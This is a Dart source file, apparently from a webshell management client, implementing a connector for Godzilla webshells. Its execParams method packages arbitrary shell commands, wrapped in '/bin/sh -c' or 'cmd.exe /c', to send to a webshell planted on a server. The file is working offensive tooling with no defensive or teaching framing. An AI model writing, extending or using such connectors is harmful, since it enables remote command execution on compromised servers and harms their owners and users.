import 'dart:convert';

import 'godzilla_connector_base.dart';
import 'godzilla_variant.dart';

/// 标准 Godzilla 马的统一连接器。
///
/// “架构 + 协议”决定用哪个连接器（`jsp_godzilla` 等），具体加密方式由
/// [GodzillaVariant] 决定（来自 `Webshell.cryption`），与原版 Godzilla
/// 的「Payload + Cryption」两级选择一致。
class GodzillaConnector extends GodzillaConnectorBase {
  GodzillaConnector(super.webshell, super.variant);

  @override
  Map<String, List<int>> execParams(String command, {required bool windows}) {
    switch (variant.execMode) {
      case GodzillaExecMode.argArray:
        // Java 引擎：可执行文件 + 参数数组；Matrix 终端需要管道/重定向，
        // 统一包一层 `sh -c`（Windows 用 `cmd.exe /c`）。
        return {
          'argsCount': utf8.encode('3'),
          'arg-0': utf8.encode(windows ? 'cmd.exe' : '/bin/sh'),
          'arg-1': utf8.encode(windows ? '/c' : '-c'),
          'arg-2': utf8.encode(command),
        };
      case GodzillaExecMode.cmdLine:
        return {'cmdLine': utf8.encode(command)};
    }
  }
}
